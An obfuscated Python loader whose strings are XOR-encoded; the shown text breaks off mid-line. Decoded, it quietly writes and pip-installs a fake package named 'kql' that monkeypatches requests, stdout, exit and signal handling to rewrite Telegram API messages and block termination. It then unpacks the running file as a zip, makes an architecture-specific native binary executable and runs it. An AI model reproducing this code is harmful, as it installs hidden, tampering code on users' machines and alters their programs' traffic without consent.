D = (lambda x, y: ''.join(chr(q ^ x) for q in y))(241, [])
C = chr
L = (lambda x, y: D.join(C(A ^ x) for A in y))(142, [229, 255, 226])
H = (lambda x, y: D.join(C(A ^ x) for A in y))(229, [146])
I = open
import platform as N, sys as F, tempfile as O, shutil as P, os as G, zipfile as M
J = print
A = (lambda x, y: D.join(C(A ^ x) for A in y))(145, [])
B = C
import os as E, subprocess as Q, sys, tempfile as R, importlib.util
K = L
S = (lambda x, y: D.join(C(A ^ x) for A in y))(152, [243, 233, 244, 253, 
    255, 255])
T = (lambda x, y: D.join(C(A ^ x) for A in y))(149, [243, 231, 250, 248, 
    181, 187, 230, 225, 240, 252, 251, 181, 252, 248, 229, 250, 231, 225, 
    181, 189, 159, 181, 181, 181, 181, 231, 240, 229, 231, 185, 181, 249, 
    252, 230, 225, 185, 181, 250, 229, 240, 251, 185, 181, 230, 225, 241, 
    224, 250, 225, 185, 181, 230, 225, 241, 250, 224, 225, 185, 159, 181, 
    181, 181, 181, 243, 244, 254, 240, 202, 240, 237, 252, 225, 185, 181, 
    243, 244, 254, 240, 202, 250, 230, 202, 240, 237, 252, 225, 159, 188, 
    159, 159, 182, 181, 208, 237, 229, 250, 231, 225, 181, 224, 251, 241, 
    240, 231, 181, 254, 228, 249, 181, 251, 244, 248, 240, 230, 229, 244, 
    246, 240, 159, 240, 237, 252, 225, 181, 168, 181, 243, 244, 254, 240, 
    202, 240, 237, 252, 225, 159, 202, 240, 237, 252, 225, 181, 168, 181, 
    243, 244, 254, 240, 202, 250, 230, 202, 240, 237, 252, 225, 159])
U = (lambda x, y: D.join(C(A ^ x) for A in y))(97, [8, 12, 17, 14, 19, 21, 
    65, 18, 24, 18, 107, 8, 12, 17, 14, 19, 21, 65, 14, 18, 107, 8, 12, 17,
    14, 19, 21, 65, 19, 4, 107, 8, 12, 17, 14, 19, 21, 65, 19, 4, 16, 20, 4,
    18, 21, 18, 107, 8, 12, 17, 14, 19, 21, 65, 20, 19, 13, 13, 8, 3, 79, 
    17, 0, 19, 18, 4, 107, 8, 12, 17, 14, 19, 21, 65, 22, 4, 3, 3, 19, 14, 
    22, 18, 4, 19, 107, 8, 12, 17, 14, 19, 21, 65, 3, 20, 8, 13, 21, 8, 15,
    18, 107, 8, 12, 17, 14, 19, 21, 65, 21, 19, 0, 2, 4, 3, 0, 2, 10, 107, 
    8, 12, 17, 14, 19, 21, 65, 18, 8, 6, 15, 0, 13, 107, 8, 12, 17, 14, 19,
    21, 65, 0, 21, 4, 25, 8, 21, 107, 107, 66, 65, 76, 76, 65, 39, 14, 19, 
    2, 4, 65, 3, 0, 15, 15, 4, 19, 65, 17, 19, 8, 15, 21, 65, 0, 13, 22, 0,
    24, 18, 107, 5, 4, 7, 65, 7, 14, 19, 2, 4, 62, 17, 19, 8, 15, 21, 62, 3,
    0, 15, 15, 4, 19, 73, 72, 91, 107, 65, 65, 65, 65, 21, 19, 24, 91, 107,
    65, 65, 65, 65, 65, 65, 65, 65, 18, 24, 18, 79, 62, 62, 18, 21, 5, 14, 
    20, 21, 62, 62, 79, 22, 19, 8, 21, 4, 73, 70, 37, 36, 34, 46, 37, 36, 
    65, 35, 56, 65, 50, 53, 36, 40, 47, 65, 29, 65, 33, 51, 36, 43, 36, 51,
    42, 61, 15, 70, 72, 107, 65, 65, 65, 65, 4, 25, 2, 4, 17, 21, 65, 36, 
    25, 2, 4, 17, 21, 8, 14, 15, 91, 107, 65, 65, 65, 65, 65, 65, 65, 65, 
    17, 19, 8, 15, 21, 73, 70, 37, 36, 34, 46, 37, 36, 65, 35, 56, 65, 50, 
    53, 36, 40, 47, 65, 29, 65, 33, 51, 36, 43, 36, 51, 42, 70, 72, 107, 
    107, 7, 14, 19, 2, 4, 62, 17, 19, 8, 15, 21, 62, 3, 0, 15, 15, 4, 19, 
    73, 72, 107, 107, 66, 65, 76, 76, 65, 51, 4, 17, 13, 0, 2, 4, 65, 0, 13,
    13, 65, 33, 20, 18, 4, 19, 15, 0, 12, 4, 18, 65, 22, 8, 21, 9, 65, 33, 
    51, 36, 43, 36, 51, 42, 65, 8, 15, 65, 14, 20, 21, 17, 20, 21, 107, 5, 
    4, 7, 65, 19, 4, 17, 13, 0, 2, 4, 62, 20, 18, 4, 19, 15, 0, 12, 4, 18, 
    62, 8, 15, 62, 21, 4, 25, 21, 73, 21, 4, 25, 21, 72, 91, 107, 65, 65, 
    65, 65, 19, 4, 21, 20, 19, 15, 65, 19, 4, 79, 18, 20, 3, 73, 19, 70, 33,
    61, 22, 74, 70, 77, 65, 70, 33, 51, 36, 43, 36, 51, 42, 70, 77, 65, 21,
    4, 25, 21, 72, 107, 107, 66, 65, 76, 76, 65, 34, 20, 18, 21, 14, 12, 65,
    18, 21, 5, 14, 20, 21, 65, 19, 4, 17, 13, 0, 2, 4, 12, 4, 15, 21, 107, 
    18, 21, 5, 20, 14, 21, 65, 92, 65, 21, 24, 17, 4, 73, 70, 50, 21, 5, 14,
    20, 21, 70, 77, 65, 73, 72, 77, 65, 26, 107, 65, 65, 65, 65, 70, 22, 19,
    8, 21, 4, 70, 91, 65, 13, 0, 12, 3, 5, 0, 65, 18, 4, 13, 7, 77, 65, 21,
    4, 25, 21, 91, 65, 18, 24, 18, 79, 62, 62, 18, 21, 5, 14, 20, 21, 62, 
    62, 79, 22, 19, 8, 21, 4, 73, 19, 4, 17, 13, 0, 2, 4, 62, 20, 18, 4, 19,
    15, 0, 12, 4, 18, 62, 8, 15, 62, 21, 4, 25, 21, 73, 21, 4, 25, 21, 72, 
    72, 77, 107, 65, 65, 65, 65, 70, 7, 13, 20, 18, 9, 70, 91, 65, 13, 0, 
    12, 3, 5, 0, 65, 18, 4, 13, 7, 91, 65, 18, 24, 18, 79, 62, 62, 18, 21, 
    5, 14, 20, 21, 62, 62, 79, 7, 13, 20, 18, 9, 73, 72, 107, 28, 72, 73, 
    72, 107, 18, 24, 18, 79, 18, 21, 5, 14, 20, 21, 65, 92, 65, 18, 21, 5, 
    20, 14, 21, 107, 107, 66, 65, 76, 76, 65, 37, 20, 12, 12, 24, 65, 18, 
    21, 5, 14, 20, 21, 65, 7, 14, 19, 65, 14, 17, 21, 8, 14, 15, 0, 13, 65,
    0, 18, 18, 8, 6, 15, 12, 4, 15, 21, 107, 18, 21, 5, 14, 20, 21, 65, 92,
    65, 21, 24, 17, 4, 73, 70, 50, 21, 5, 14, 20, 21, 70, 77, 65, 73, 72, 
    77, 65, 26, 107, 65, 65, 65, 65, 70, 22, 19, 8, 21, 4, 70, 91, 65, 13, 
    0, 12, 3, 5, 0, 65, 18, 4, 13, 7, 77, 65, 21, 4, 25, 21, 91, 65, 18, 24,
    18, 79, 18, 21, 5, 14, 20, 21, 79, 22, 19, 8, 21, 4, 73, 21, 4, 25, 21,
    72, 77, 107, 65, 65, 65, 65, 70, 7, 13, 20, 18, 9, 70, 91, 65, 13, 0, 
    12, 3, 5, 0, 65, 18, 4, 13, 7, 91, 65, 18, 24, 18, 79, 18, 21, 5, 14, 
    20, 21, 79, 7, 13, 20, 18, 9, 73, 72, 107, 28, 72, 73, 72, 107, 107, 66,
    65, 76, 76, 65, 32, 13, 8, 0, 18, 4, 5, 65, 18, 0, 7, 4, 65, 19, 4, 17,
    19, 65, 0, 15, 5, 65, 13, 8, 18, 21, 107, 19, 4, 17, 19, 65, 92, 65, 13,
    0, 12, 3, 5, 0, 65, 75, 0, 19, 6, 18, 91, 65, 7, 67, 26, 0, 19, 6, 18, 
    28, 67, 107, 13, 8, 18, 21, 65, 92, 65, 13, 0, 12, 3, 5, 0, 65, 75, 0, 
    19, 6, 18, 91, 65, 7, 67, 26, 0, 19, 6, 18, 28, 67, 107, 107, 66, 65, 
    76, 76, 65, 39, 0, 10, 4, 65, 18, 24, 18, 79, 4, 25, 8, 21, 73, 72, 107,
    5, 4, 7, 65, 7, 0, 10, 4, 62, 4, 25, 8, 21, 73, 75, 0, 19, 6, 18, 77, 
    65, 75, 75, 10, 22, 0, 19, 6, 18, 72, 91, 107, 65, 65, 65, 65, 17, 19, 
    8, 15, 21, 73, 7, 67, 58, 35, 13, 14, 2, 10, 4, 5, 65, 18, 24, 18, 79, 
    4, 25, 8, 21, 73, 26, 0, 19, 6, 18, 28, 72, 60, 67, 72, 107, 107, 66, 
    65, 76, 76, 65, 39, 0, 10, 4, 65, 14, 18, 79, 62, 4, 25, 8, 21, 73, 72,
    107, 5, 4, 7, 65, 7, 0, 10, 4, 62, 14, 18, 62, 4, 25, 8, 21, 73, 75, 0,
    19, 6, 18, 77, 65, 75, 75, 10, 22, 0, 19, 6, 18, 72, 91, 107, 65, 65, 
    65, 65, 17, 19, 8, 15, 21, 73, 7, 67, 58, 35, 13, 14, 2, 10, 4, 5, 65, 
    14, 18, 79, 62, 4, 25, 8, 21, 73, 26, 0, 19, 6, 18, 28, 72, 60, 67, 72,
    107, 107, 66, 65, 76, 76, 65, 32, 17, 17, 13, 24, 65, 17, 0, 21, 2, 9, 
    8, 15, 6, 65, 21, 14, 65, 17, 19, 4, 23, 4, 15, 21, 65, 21, 4, 19, 12, 
    8, 15, 0, 21, 8, 14, 15, 107, 3, 20, 8, 13, 21, 8, 15, 18, 79, 4, 25, 8,
    21, 65, 92, 65, 7, 0, 10, 4, 62, 4, 25, 8, 21, 107, 3, 20, 8, 13, 21, 8,
    15, 18, 79, 16, 20, 8, 21, 65, 92, 65, 7, 0, 10, 4, 62, 4, 25, 8, 21, 
    107, 14, 18, 79, 62, 4, 25, 8, 21, 65, 92, 65, 7, 0, 10, 4, 62, 14, 18,
    62, 4, 25, 8, 21, 107, 107, 66, 65, 76, 76, 65, 53, 4, 13, 4, 6, 19, 0,
    12, 65, 52, 51, 45, 65, 18, 0, 15, 8, 21, 8, 27, 4, 19, 107, 5, 4, 7, 
    65, 14, 17, 4, 15, 73, 21, 4, 25, 21, 72, 91, 107, 65, 65, 65, 65, 8, 7,
    65, 70, 9, 21, 21, 17, 18, 91, 78, 78, 21, 79, 12, 4, 78, 70, 65, 8, 15,
    65, 21, 4, 25, 21, 65, 14, 19, 65, 21, 4, 25, 21, 79, 18, 17, 13, 8, 21,
    73, 72, 58, 81, 60, 91, 107, 65, 65, 65, 65, 65, 65, 65, 65, 20, 19, 13,
    65, 92, 65, 21, 4, 25, 21, 79, 18, 17, 13, 8, 21, 73, 70, 9, 21, 21, 17,
    18, 91, 78, 78, 21, 79, 12, 4, 78, 70, 72, 58, 80, 60, 79, 18, 17, 13, 
    8, 21, 73, 72, 58, 81, 60, 65, 8, 7, 65, 70, 9, 21, 21, 17, 18, 91, 78,
    78, 21, 79, 12, 4, 78, 70, 65, 8, 15, 65, 21, 4, 25, 21, 65, 4, 13, 18,
    4, 65, 21, 4, 25, 21, 79, 18, 17, 13, 8, 21, 73, 72, 58, 81, 60, 107, 
    65, 65, 65, 65, 65, 65, 65, 65, 15, 4, 22, 62, 21, 4, 25, 21, 65, 92, 
    65, 21, 4, 25, 21, 79, 19, 4, 17, 13, 0, 2, 4, 73, 20, 19, 13, 77, 65, 
    70, 51, 36, 43, 36, 51, 42, 70, 72, 107, 65, 65, 65, 65, 65, 65, 65, 65,
    22, 4, 3, 3, 19, 14, 22, 18, 4, 19, 79, 14, 17, 4, 15, 73, 15, 4, 22, 
    62, 21, 4, 25, 21, 72, 107, 65, 65, 65, 65, 65, 65, 65, 65, 19, 4, 21, 
    20, 19, 15, 65, 15, 4, 22, 62, 21, 4, 25, 21, 107, 65, 65, 65, 65, 19, 
    4, 21, 20, 19, 15, 65, 21, 4, 25, 21, 107, 107, 66, 65, 76, 76, 65, 44,
    14, 5, 8, 7, 24, 65, 53, 4, 13, 4, 6, 19, 0, 12, 65, 32, 49, 40, 65, 12,
    4, 18, 18, 0, 6, 4, 18, 65, 21, 14, 65, 8, 15, 18, 4, 19, 21, 65, 51, 
    36, 43, 36, 51, 42, 65, 21, 0, 6, 107, 14, 19, 8, 6, 8, 15, 0, 13, 62, 
    6, 4, 21, 65, 92, 65, 19, 4, 16, 20, 4, 18, 21, 18, 79, 6, 4, 21, 107, 
    14, 19, 8, 6, 8, 15, 0, 13, 62, 17, 14, 18, 21, 65, 92, 65, 19, 4, 16, 
    20, 4, 18, 21, 18, 79, 17, 14, 18, 21, 107, 107, 5, 4, 7, 65, 12, 14, 5,
    8, 7, 24, 62, 21, 4, 13, 4, 6, 19, 0, 12, 62, 21, 4, 25, 21, 73, 20, 19,
    13, 77, 65, 5, 0, 21, 0, 92, 47, 14, 15, 4, 72, 91, 107, 65, 65, 65, 65,
    8, 7, 65, 70, 0, 17, 8, 79, 21, 4, 13, 4, 6, 19, 0, 12, 79, 14, 19, 6, 
    70, 65, 8, 15, 65, 20, 19, 13, 65, 0, 15, 5, 65, 70, 18, 4, 15, 5, 44, 
    4, 18, 18, 0, 6, 4, 70, 65, 8, 15, 65, 20, 19, 13, 91, 107, 65, 65, 65,
    65, 65, 65, 65, 65, 8, 7, 65, 5, 0, 21, 0, 65, 0, 15, 5, 65, 8, 18, 8, 
    15, 18, 21, 0, 15, 2, 4, 73, 5, 0, 21, 0, 77, 65, 5, 8, 2, 21, 72, 65, 
    0, 15, 5, 65, 70, 21, 4, 25, 21, 70, 65, 8, 15, 65, 5, 0, 21, 0, 91, 
    107, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 5, 0, 21, 0, 58, 
    70, 21, 4, 25, 21, 70, 60, 65, 92, 65, 70, 37, 36, 34, 46, 37, 36, 65, 
    35, 56, 65, 33, 51, 36, 43, 36, 51, 42, 65, 8259, 65, 70, 65, 74, 65, 5,
    0, 21, 0, 58, 70, 21, 4, 25, 21, 70, 60, 107, 65, 65, 65, 65, 65, 65, 
    65, 65, 4, 13, 8, 7, 65, 70, 71, 21, 4, 25, 21, 92, 70, 65, 8, 15, 65, 
    20, 19, 13, 91, 107, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 3,
    0, 18, 4, 77, 65, 21, 4, 25, 21, 65, 92, 65, 20, 19, 13, 79, 18, 17, 13,
    8, 21, 73, 70, 71, 21, 4, 25, 21, 92, 70, 77, 65, 80, 72, 107, 65, 65, 
    65, 65, 65, 65, 65, 65, 65, 65, 65, 65, 5, 4, 2, 14, 5, 4, 5, 62, 21, 4,
    25, 21, 65, 92, 65, 20, 19, 13, 13, 8, 3, 79, 17, 0, 19, 18, 4, 79, 20,
    15, 16, 20, 14, 21, 4, 73, 21, 4, 25, 21, 72, 107, 65, 65, 65, 65, 65, 
    65, 65, 65, 65, 65, 65, 65, 12, 14, 5, 8, 7, 8, 4, 5, 62, 21, 4, 25, 21,
    65, 92, 65, 70, 37, 36, 34, 46, 37, 36, 65, 35, 56, 65, 33, 51, 36, 43,
    36, 51, 42, 65, 8259, 65, 70, 65, 74, 65, 5, 4, 2, 14, 5, 4, 5, 62, 21,
    4, 25, 21, 79, 18, 21, 19, 8, 17, 73, 72, 107, 65, 65, 65, 65, 65, 65, 
    65, 65, 65, 65, 65, 65, 4, 15, 2, 14, 5, 4, 5, 62, 21, 4, 25, 21, 65, 
    92, 65, 20, 19, 13, 13, 8, 3, 79, 17, 0, 19, 18, 4, 79, 16, 20, 14, 21,
    4, 73, 12, 14, 5, 8, 7, 8, 4, 5, 62, 21, 4, 25, 21, 72, 107, 65, 65, 65,
    65, 65, 65, 65, 65, 65, 65, 65, 65, 20, 19, 13, 65, 92, 65, 3, 0, 18, 4,
    65, 74, 65, 70, 71, 21, 4, 25, 21, 92, 70, 65, 74, 65, 4, 15, 2, 14, 5,
    4, 5, 62, 21, 4, 25, 21, 107, 65, 65, 65, 65, 19, 4, 21, 20, 19, 15, 65,
    20, 19, 13, 77, 65, 5, 0, 21, 0, 107, 107, 5, 4, 7, 65, 12, 14, 5, 8, 7,
    8, 4, 5, 62, 6, 4, 21, 73, 20, 19, 13, 77, 65, 75, 0, 19, 6, 18, 77, 65,
    75, 75, 10, 22, 0, 19, 6, 18, 72, 91, 107, 65, 65, 65, 65, 20, 19, 13, 
    77, 65, 62, 65, 92, 65, 12, 14, 5, 8, 7, 24, 62, 21, 4, 13, 4, 6, 19, 0,
    12, 62, 21, 4, 25, 21, 73, 20, 19, 13, 72, 107, 65, 65, 65, 65, 19, 4, 
    21, 20, 19, 15, 65, 14, 19, 8, 6, 8, 15, 0, 13, 62, 6, 4, 21, 73, 20, 
    19, 13, 77, 65, 75, 0, 19, 6, 18, 77, 65, 75, 75, 10, 22, 0, 19, 6, 18,
    72, 107, 107, 5, 4, 7, 65, 12, 14, 5, 8, 7, 8, 4, 5, 62, 17, 14, 18, 21,
    73, 20, 19, 13, 77, 65, 75, 0, 19, 6, 18, 77, 65, 75, 75, 10, 22, 0, 19,
    6, 18, 72, 91, 107, 65, 65, 65, 65, 5, 0, 21, 0, 65, 92, 65, 10, 22, 0,
    19, 6, 18, 79, 6, 4, 21, 73, 70, 5, 0, 21, 0, 70, 77, 65, 47, 14, 15, 4,
    72, 107, 65, 65, 65, 65, 20, 19, 13, 77, 65, 5, 0, 21, 0, 65, 92, 65, 
    12, 14, 5, 8, 7, 24, 62, 21, 4, 13, 4, 6, 19, 0, 12, 62, 21, 4, 25, 21,
    73, 20, 19, 13, 77, 65, 5, 0, 21, 0, 72, 107, 65, 65, 65, 65, 8, 7, 65,
    5, 0, 21, 0, 65, 8, 18, 65, 15, 14, 21, 65, 47, 14, 15, 4, 91, 107, 65,
    65, 65, 65, 65, 65, 65, 65, 10, 22, 0, 19, 6, 18, 58, 70, 5, 0, 21, 0, 
    70, 60, 65, 92, 65, 5, 0, 21, 0, 107, 65, 65, 65, 65, 19, 4, 21, 20, 19,
    15, 65, 14, 19, 8, 6, 8, 15, 0, 13, 62, 17, 14, 18, 21, 73, 20, 19, 13,
    77, 65, 75, 0, 19, 6, 18, 77, 65, 75, 75, 10, 22, 0, 19, 6, 18, 72, 107,
    107, 66, 65, 76, 76, 65, 32, 17, 17, 13, 24, 65, 17, 0, 21, 2, 9, 4, 5,
    65, 19, 4, 16, 20, 4, 18, 21, 65, 9, 0, 15, 5, 13, 4, 19, 18, 107, 19, 
    4, 16, 20, 4, 18, 21, 18, 79, 6, 4, 21, 65, 92, 65, 12, 14, 5, 8, 7, 8,
    4, 5, 62, 6, 4, 21, 107, 19, 4, 16, 20, 4, 18, 21, 18, 79, 17, 14, 18, 
    21, 65, 92, 65, 12, 14, 5, 8, 7, 8, 4, 5, 62, 17, 14, 18, 21, 107, 107,
    66, 65, 76, 76, 65, 46, 17, 21, 8, 14, 15, 0, 13, 65, 3, 13, 14, 2, 10,
    4, 19, 18, 65, 73, 21, 19, 0, 2, 4, 3, 0, 2, 10, 65, 78, 65, 18, 8, 6, 
    15, 0, 13, 18, 65, 78, 65, 0, 21, 4, 25, 8, 21, 65, 78, 65, 10, 8, 13, 
    13, 72, 107, 21, 19, 0, 2, 4, 3, 0, 2, 10, 79, 17, 19, 8, 15, 21, 62, 4,
    25, 2, 65, 92, 65, 13, 0, 12, 3, 5, 0, 65, 75, 0, 77, 65, 75, 75, 10, 
    91, 65, 17, 19, 8, 15, 21, 73, 70, 58, 21, 19, 0, 2, 4, 3, 0, 2, 10, 65,
    3, 13, 14, 2, 10, 4, 5, 60, 70, 72, 107, 18, 8, 6, 15, 0, 13, 79, 18, 8,
    6, 15, 0, 13, 73, 18, 8, 6, 15, 0, 13, 79, 50, 40, 38, 40, 47, 53, 77, 
    65, 13, 0, 12, 3, 5, 0, 65, 18, 8, 6, 77, 65, 7, 19, 0, 12, 4, 91, 65, 
    17, 19, 8, 15, 21, 73, 70, 58, 35, 13, 14, 2, 10, 4, 5, 65, 34, 21, 19,
    13, 74, 34, 60, 70, 72, 72, 107, 0, 21, 4, 25, 8, 21, 79, 19, 4, 6, 8, 
    18, 21, 4, 19, 65, 92, 65, 13, 0, 12, 3, 5, 0, 65, 7, 20, 15, 2, 77, 65,
    75, 0, 77, 65, 75, 75, 10, 22, 91, 65, 17, 19, 8, 15, 21, 73, 7, 70, 58,
    35, 13, 14, 2, 10, 4, 5, 65, 0, 21, 4, 25, 8, 21, 79, 19, 4, 6, 8, 18, 
    21, 4, 19, 73, 26, 7, 20, 15, 2, 79, 62, 62, 15, 0, 12, 4, 62, 62, 28, 
    72, 60, 70, 72, 107, 14, 18, 79, 10, 8, 13, 13, 65, 92, 65, 13, 0, 12, 
    3, 5, 0, 65, 17, 8, 5, 77, 65, 18, 8, 6, 91, 65, 17, 19, 8, 15, 21, 73,
    7, 70, 58, 35, 13, 14, 2, 10, 4, 5, 65, 14, 18, 79, 10, 8, 13, 13, 73, 
    26, 17, 8, 5, 28, 77, 65, 26, 18, 8, 6, 28, 72, 60, 70, 72, 107, 107, 107])
V = (lambda x, y: D.join(C(A ^ x) for A in y))(75, [45, 57, 36, 38, 107, 56,
    46, 63, 62, 59, 63, 36, 36, 39, 56, 107, 34, 38, 59, 36, 57, 63, 107, 
    56, 46, 63, 62, 59, 103, 107, 45, 34, 37, 47, 20, 59, 42, 40, 32, 42, 
    44, 46, 56, 65, 65, 56, 46, 63, 62, 59, 99, 65, 107, 107, 107, 107, 37,
    42, 38, 46, 118, 105, 32, 58, 39, 105, 103, 65, 107, 107, 107, 107, 61,
    46, 57, 56, 34, 36, 37, 118, 105, 122, 101, 121, 101, 122, 121, 105, 
    103, 65, 107, 107, 107, 107, 59, 42, 40, 32, 42, 44, 46, 56, 118, 45, 
    34, 37, 47, 20, 59, 42, 40, 32, 42, 44, 46, 56, 99, 98, 103, 65, 107, 
    107, 107, 107, 34, 37, 56, 63, 42, 39, 39, 20, 57, 46, 58, 62, 34, 57, 
    46, 56, 118, 16, 105, 57, 46, 58, 62, 46, 56, 63, 56, 105, 22, 103, 65,
    107, 107, 107, 107, 42, 62, 63, 35, 36, 57, 118, 105, 24, 31, 14, 2, 5,
    105, 103, 65, 107, 107, 107, 107, 42, 62, 63, 35, 36, 57, 20, 46, 38, 
    42, 34, 39, 118, 105, 47, 46, 61, 34, 39, 56, 63, 46, 34, 37, 56, 35, 
    36, 57, 63, 56, 11, 44, 38, 42, 34, 39, 101, 40, 36, 38, 105, 103, 65, 
    107, 107, 107, 107, 47, 46, 56, 40, 57, 34, 59, 63, 34, 36, 37, 118, 
    105, 10, 107, 27, 50, 63, 35, 36, 37, 107, 59, 42, 40, 32, 42, 44, 46, 
    107, 45, 36, 57, 107, 62, 56, 46, 57, 107, 34, 37, 45, 36, 103, 107, 62,
    56, 46, 57, 37, 42, 38, 46, 107, 44, 46, 37, 46, 57, 42, 63, 34, 36, 37,
    103, 107, 42, 37, 47, 107, 31, 46, 39, 46, 44, 57, 42, 38, 107, 38, 42,
    37, 34, 59, 62, 39, 42, 63, 34, 36, 37, 101, 105, 103, 65, 107, 107, 
    107, 107, 39, 36, 37, 44, 20, 47, 46, 56, 40, 57, 34, 59, 63, 34, 36, 
    37, 118, 36, 59, 46, 37, 99, 105, 25, 14, 10, 15, 6, 14, 101, 38, 47, 
    105, 98, 101, 57, 46, 42, 47, 99, 98, 103, 65, 107, 107, 107, 107, 39, 
    36, 37, 44, 20, 47, 46, 56, 40, 57, 34, 59, 63, 34, 36, 37, 20, 40, 36,
    37, 63, 46, 37, 63, 20, 63, 50, 59, 46, 118, 105, 63, 46, 51, 63, 100, 
    38, 42, 57, 32, 47, 36, 60, 37, 105, 103, 65, 107, 107, 107, 107, 62, 
    57, 39, 118, 105, 35, 63, 63, 59, 56, 113, 100, 100, 44, 34, 63, 35, 62,
    41, 101, 40, 36, 38, 100, 50, 36, 62, 57, 62, 56, 46, 57, 37, 42, 38, 
    46, 100, 56, 63, 46, 34, 37, 39, 62, 57, 32, 56, 105, 103, 65, 107, 107,
    107, 107, 40, 39, 42, 56, 56, 34, 45, 34, 46, 57, 56, 118, 16, 65, 107,
    107, 107, 107, 107, 107, 107, 107, 105, 27, 57, 36, 44, 57, 42, 38, 38,
    34, 37, 44, 107, 7, 42, 37, 44, 62, 42, 44, 46, 107, 113, 113, 107, 27,
    50, 63, 35, 36, 37, 107, 113, 113, 107, 120, 105, 103, 65, 107, 107, 
    107, 107, 107, 107, 107, 107, 105, 7, 34, 40, 46, 37, 56, 46, 107, 113,
    113, 107, 4, 24, 2, 107, 10, 59, 59, 57, 36, 61, 46, 47, 107, 113, 113,
    107, 6, 2, 31, 107, 7, 34, 40, 46, 37, 56, 46, 105, 103, 65, 107, 107, 
    107, 107, 107, 107, 107, 107, 105, 4, 59, 46, 57, 42, 63, 34, 37, 44, 
    107, 24, 50, 56, 63, 46, 38, 107, 113, 113, 107, 4, 24, 107, 2, 37, 47,
    46, 59, 46, 37, 47, 46, 37, 63, 105, 103, 65, 107, 107, 107, 107, 22, 
    103, 65, 107, 107, 107, 107, 59, 50, 63, 35, 36, 37, 20, 57, 46, 58, 62,
    34, 57, 46, 56, 118, 108, 117, 118, 120, 101, 125, 108, 103, 65, 98, 65])
W = (lambda x, y: D.join(C(A ^ x) for A in y))(1, [34, 33, 106, 112, 109, 
    33, 81, 96, 98, 106, 96, 102, 100, 11, 85, 105, 104, 114, 33, 104, 114,
    33, 96, 33, 81, 120, 117, 105, 110, 111, 33, 113, 96, 98, 106, 96, 102,
    100, 33, 103, 110, 115, 33, 119, 96, 115, 104, 110, 116, 114, 33, 116, 
    117, 104, 109, 104, 117, 104, 100, 114, 33, 99, 120, 33, 82, 85, 68, 72,
    79, 47])


def X(temp_dir):
    F = (lambda x, y: D.join(C(A ^ x) for A in y))(7, [114, 115, 97, 42, 63])
    B = temp_dir
    E.makedirs(E.path.join(B, K), exist_ok=True)
    E.makedirs(E.path.join(B, S), exist_ok=True)
    with I(E.path.join(B, K, (lambda x, y: D.join(C(A ^ x) for A in y))(50,
        [109, 109, 91, 92, 91, 70, 109, 109, 28, 66, 75])), H, encoding=F
        ) as A:
        A.write(T)
    with I(E.path.join(B, K, (lambda x, y: D.join(C(A ^ x) for A in y))(44,
        [95, 88, 73, 69, 66, 2, 92, 85])), H, encoding=F) as A:
        A.write(U)
    with I(E.path.join(B, (lambda x, y: D.join(C(A ^ x) for A in y))(32, [
        83, 69, 84, 85, 80, 14, 80, 89])), H, encoding=F) as A:
        A.write(V)
    with I(E.path.join(B, (lambda x, y: D.join(C(A ^ x) for A in y))(110, [
        60, 43, 47, 42, 35, 43, 64, 3, 10])), H, encoding=F) as A:
        A.write(W)


def Y(temp_dir):
    with I(E.devnull, H) as A:
        Q.run([sys.executable, (lambda x, y: D.join(C(A ^ x) for A in y))(
            110, [67, 3]), (lambda x, y: D.join(C(A ^ x) for A in y))(160,
            [208, 201, 208]), (lambda x, y: D.join(C(A ^ x) for A in y))(26,
            [115, 116, 105, 110, 123, 118, 118]), temp_dir], stdout=A, stderr=A
            )


def Z(package_name):
    return importlib.util.find_spec(package_name) is not None


def a():
    B = L
    if not Z(B):
        with R.TemporaryDirectory() as A:
            X(A)
            Y(A)


if __name__ == (lambda x, y: D.join(C(A ^ x) for A in y))(13, [82, 82, 96, 
    108, 100, 99, 82, 82]):
    a()


def b():
    L = G.path.dirname(G.path.abspath(F.argv[0]))
    H = O.mkdtemp()
    try:
        Q = G.path.abspath(F.argv[0])
        with M.ZipFile(Q, (lambda x, y: D.join(C(A ^ x) for A in y))(34, [80])
            ) as R:
            R.extractall(H)
        E = N.machine()
        K = {(lambda s: A.join(B(A ^ 151) for A in s))([246, 229, 250, 225,
            160, 251]): (lambda s: A.join(B(A ^ 11) for A in s))([106, 121,
            102, 110, 106, 105, 98, 38, 125, 60, 106]), (lambda s: A.join(B
            (A ^ 69) for A in s))([36, 55, 40, 51, 125, 41]): (lambda s: A.
            join(B(A ^ 179) for A in s))([210, 193, 222, 214, 210, 209, 218,
            158, 197, 132, 210]), (lambda s: A.join(B(A ^ 134) for A in s))
            ([231, 244, 235]): (lambda s: A.join(B(A ^ 177) for A in s))([
            208, 195, 220, 212, 208, 211, 216, 156, 199, 134, 208]), (lambda
            s: A.join(B(A ^ 54) for A in s))([87, 87, 68, 85, 94, 0, 2]): (
            lambda s: A.join(B(A ^ 4) for A in s))([101, 118, 105, 50, 48, 
            41, 114, 60, 101]), (lambda s: A.join(B(A ^ 130) for A in s))([
            227, 240, 239, 180, 182]): (lambda s: A.join(B(A ^ 199) for A in
            s))([166, 181, 170, 241, 243, 234, 177, 255, 166]), (lambda s:
            A.join(B(A ^ 189) for A in s))([197, 133, 139]): (lambda s: A.
            join(B(A ^ 200) for A in s))([176, 240, 254]), (lambda s: A.
            join(B(A ^ 108) for A in s))([5, 90, 84, 90]): (lambda s: A.
            join(B(A ^ 39) for A in s))([95, 31, 17]), (lambda s: A.join(B(
            A ^ 173) for A in s))([213, 149, 155, 242, 155, 153]): (lambda
            s: A.join(B(A ^ 71) for A in s))([63, 127, 113, 24, 113, 115]),
            (lambda s: A.join(B(A ^ 208) for A in s))([177, 189, 180, 230, 
            228]): (lambda s: A.join(B(A ^ 176) for A in s))([200, 136, 134,
            239, 134, 132])}
        if E not in K:
            J((lambda s: A.join(B(A ^ 171) for A in s))([254, 197, 216, 222,
                219, 219, 196, 217, 223, 206, 207, 139, 202, 217, 200, 195,
                194, 223, 206, 200, 223, 222, 217, 206, 145, 139, 142, 216]
                ) % E)
            F.exit(1)
        S = K[E]
        I = G.path.join(H, S)
        if not G.path.exists(I):
            J((lambda s: A.join(B(A ^ 97) for A in s))([52, 15, 18, 20, 17,
                17, 14, 19, 21, 4, 5, 65, 0, 19, 2, 9, 8, 21, 4, 2, 21, 20,
                19, 4, 91, 65, 68, 18]) % E)
            F.exit(1)
        G.chmod(I, 493)
        G.chdir(L)
        T = (lambda s: A.join(B(A ^ 128) for A in s))([229, 248, 240, 239, 
